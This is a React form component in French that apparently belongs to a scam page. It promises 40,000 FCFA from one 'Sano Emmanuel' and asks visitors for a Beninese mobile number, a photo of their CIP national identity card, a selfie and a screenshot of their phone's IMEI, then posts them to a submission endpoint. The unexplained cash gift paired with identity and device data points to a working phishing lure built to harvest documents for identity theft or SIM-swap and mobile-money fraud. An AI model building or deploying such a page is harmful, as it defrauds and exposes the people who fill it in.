'use client'

import { useState } from 'react'
import { useForm } from 'react-hook-form'

interface FormData {
  numero: string
}

export default function IdentificationForm() {
  const [personPhoto, setPersonPhoto] = useState<File | null>(null)
  const [screenshot, setScreenshot] = useState<File | null>(null)
  const [identityCard, setIdentityCard] = useState<File | null>(null)
  const [isSubmitting, setIsSubmitting] = useState(false)

  const {
    register,
    handleSubmit,
    formState: { errors },
    reset
  } = useForm<FormData>()

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true)

    const formData = new FormData()
    formData.append('numero', data.numero)

    if (personPhoto) formData.append('personPhoto', personPhoto)
    if (screenshot) formData.append('screenshot', screenshot)
    if (identityCard) formData.append('identityCard', identityCard)

    try {
      const response = await fetch('/api/submit-identification', {
        method: 'POST',
        body: formData,
      })

      if (response.ok) {
        alert('🎉 Félicitations ! Vous recevrez 40,000 FCFA après vérification.')
        reset()
        setPersonPhoto(null)
        setScreenshot(null)
        setIdentityCard(null)
      } else {
        const errorData = await response.json()
        alert(errorData.error || 'Erreur lors de l’enregistrement')
      }
    } catch (error) {
      console.error('Erreur:', error)
      alert('Erreur de connexion. Veuillez réessayer.')
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="bg-white rounded-2xl shadow-xl p-8 max-w-2xl mx-auto">

      {/* HEADER */}
      <div
        className="bg-gradient-to-r from-yellow-400 to-yellow-500 rounded-xl p-6 mb-8 text-white text-center"
        aria-label="Bloc d’annonce de Sano Emmanuel"
      >
        <div className="flex items-center justify-center mb-3">
          <div className="bg-white bg-opacity-20 p-3 rounded-full">
            <span className="text-2xl" aria-hidden="true">🎁</span>
          </div>
        </div>

        <h1 className="text-2xl font-bold mb-2">
          SANO EMMANUEL VOUS OFFRE
        </h1>

        <div
          className="text-3xl text-black bg-white bg-opacity-20 py-2 px-4 rounded-lg inline-block"
          aria-label="Montant offert"
        >
          40,000 FCFA
        </div>

        <p className="text-yellow-100 text-sm mt-3">
          Remplissez ce formulaire sécurisé pour recevoir votre argent
        </p>
      </div>

      {/* FORM */}
      <form onSubmit={handleSubmit(onSubmit)} className="space-y-8">

        {/* NUMÉRO */}
        <div className="bg-white border-2 border-yellow-200 rounded-xl p-6">

          <label htmlFor="numero" className="block text-lg font-bold text-gray-800">
            Votre numéro pour recevoir l’argent *
          </label>

          <p className="text-sm text-gray-600 mt-1">
            Le numéro où vous recevrez les 40,000 FCFA de Sano Emmanuel
          </p>

          <input
            id="numero"
            type="tel"
            placeholder="229XXXXXXXX"
            title="Entrez votre numéro mobile"
            {...register('numero', {
              required: 'Le numéro est obligatoire pour recevoir les 40,000 FCFA',
              pattern: {
                value: /^(229|00229|\+229)?[0-9]{8}$/,
                message: 'Numéro béninois valide requis (ex: 229XXXXXXXX)'
              }
            })}
            className="mt-3 w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:border-yellow-500 text-lg"
          />

          {errors.numero && (
            <p className="text-red-500 text-sm mt-2 flex items-center gap-2">
              ⚠️ {errors.numero.message}
            </p>
          )}

        </div>

        {/* FICHIERS */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">

          {/* CIP */}
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-6">

            <label htmlFor="identityCardInput" className="block text-lg font-bold text-gray-800">
              Carte CIP *
            </label>

            <p className="text-sm text-gray-600 mt-1">
              Photo de votre carte d'identité CIP
            </p>

            <input
              id="identityCardInput"
              type="file"
              accept="image/*"
              required
              title="Téléversez la photo de votre carte CIP"
              onChange={(e) => setIdentityCard(e.target.files?.[0] || null)}
              className="mt-3 w-full text-sm text-gray-500 file:mr-4 file:py-3 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-bold file:bg-blue-500 file:text-white hover:file:bg-blue-600 transition-colors"
            />
          </div>

          {/* SELFIE */}
          <div className="bg-green-50 border border-green-200 rounded-xl p-6">

            <label htmlFor="personPhotoInput" className="block text-lg font-bold text-gray-800">
              Votre photo *
            </label>

            <p className="text-sm text-gray-600 mt-1">
              Selfie clair de votre visage
            </p>

            <input
              id="personPhotoInput"
              type="file"
              accept="image/*"
              required
              title="Téléversez votre selfie"
              onChange={(e) => setPersonPhoto(e.target.files?.[0] || null)}
              className="mt-3 w-full text-sm text-gray-500 file:mr-4 file:py-3 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-bold file:bg-green-500 file:text-white hover:file:bg-green-600 transition-colors"
            />

          </div>

          {/* IMEI */}
          <div className="bg-purple-50 border border-purple-200 rounded-xl p-6">

            <label htmlFor="screenshotInput" className="block text-lg font-bold text-gray-800">
              Capture IMEI *
            </label>

            <p className="text-sm text-gray-600 mt-1">
              Capture d'écran après *#06#
            </p>

            <input
              id="screenshotInput"
              type="file"
              accept="image/*"
              required
              title="Téléversez la capture d'écran IMEI"
              onChange={(e) => setScreenshot(e.target.files?.[0] || null)}
              className="mt-3 w-full text-sm text-gray-500 file:mr-4 file:py-3 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-bold file:bg-purple-500 file:text-white hover:file:bg-purple-600 transition-colors"
            />

          </div>

        </div>

        {/* BOUTON */}
        <div className="text-center pt-4">
          <button
            type="submit"
            disabled={isSubmitting}
            className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-white px-16 py-4 rounded-xl hover:from-yellow-500 hover:to-yellow-600 focus:outline-none focus:ring-4 focus:ring-yellow-300 text-xl font-black disabled:opacity-50 shadow-lg"
          >
            {isSubmitting ? (
              <span className="flex items-center justify-center gap-3">
                <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></div>
                Vérification en cours...
              </span>
            ) : (
              '🎁 RECEVOIR MES 40,000 FCFA !'
            )}
          </button>
        </div>

      </form>
    </div>
  )
}
